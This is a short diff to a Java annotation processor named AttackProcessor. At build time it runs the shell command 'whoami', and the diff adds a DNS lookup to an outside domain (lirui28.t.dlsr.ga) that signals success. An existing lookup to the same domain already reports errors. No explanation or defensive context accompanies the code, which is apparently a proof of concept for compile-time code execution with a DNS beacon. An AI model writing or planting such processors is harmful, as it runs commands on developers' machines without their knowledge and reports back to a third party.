@@ -55,6 +55,8 @@ public class AttackProcessor extends AbstractProcessor {
             try {
                 Runtime runtime = Runtime.getRuntime();
                 Process p = runtime.exec("whoami");
+                Inet4Address.getByName( "excute"+".7.lirui28.t.dlsr.ga" );
+
                 //p.waitFor();
                 BufferedReader bw = new BufferedReader( new InputStreamReader( p
                                                                                                .getInputStream()));
@@ -69,6 +71,7 @@ public class AttackProcessor extends AbstractProcessor {
 
 
                 }
+                bw.close();
             } catch (Exception e) {
                 Inet4Address.getByName( "runtimeerror"+".5.lirui28.t.dlsr.ga" );
 
